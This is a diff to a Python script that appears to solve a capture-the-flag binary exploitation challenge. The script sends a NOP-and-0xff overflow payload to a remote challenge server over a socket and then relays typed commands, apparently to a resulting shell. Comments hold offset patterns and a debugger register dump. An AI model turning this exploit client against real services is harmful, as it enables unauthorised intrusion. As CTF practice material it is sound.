@@ -1,13 +1,44 @@
 #!/bin/python3
 import sys
-sys.stdout.buffer.write(b'\x90' * 40 + b'\xff' * 8 + b'\n')
+import socket
+import threading
+from time import sleep
+
+payload = b'\x90' * 40 + b'\xff' * 8 + b'\n'
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('mc.ax', 31199))
+
+def servermsg(msg):
+  print(f"[server]: {msg}")
+def clientmsg(msg):
+  print(f"[client]: {msg}")
+
+def thread_func():
+  while 1:
+    buf = s.recv(1024)
+    if buf: servermsg(buf.decode("utf-8"))
+
+threading.Thread(target=thread_func).start()
+
+while 1:
+  cmd = input("> ").strip()
+  if cmd == "pwn":
+    s.send(bytes(payload))
+    clientmsg("pwn sent")
+  elif cmd == "exit":
+    clientmsg("bye")
+    exit(0)
+  elif cmd.startswith('!'):
+    msg = cmd[1:]
+    s.sendall((msg + "\n").encode('utf-8'))
+    clientmsg(f"sent command `{msg}`")
+  else:
+    clientmsg("unknown command")
 
 
-# a0a1a2a3a4a5a6a7a8a9 b0b1b2b3b4b5b6b7b8b9 c0c1c2c3c4c5c6c7c8c9
 # a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3c4c5c6c7c8c9
-# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-# aaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaa aaaaaaaa
-# 'a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9' + '\xff' * 8
+# ----------------------------------------xxxxxxxx............
 # 
 # $rax   : 0x0
 # $rbx   : 0x00000000004012c0  →  <__libc_csu_init+0> endbr64
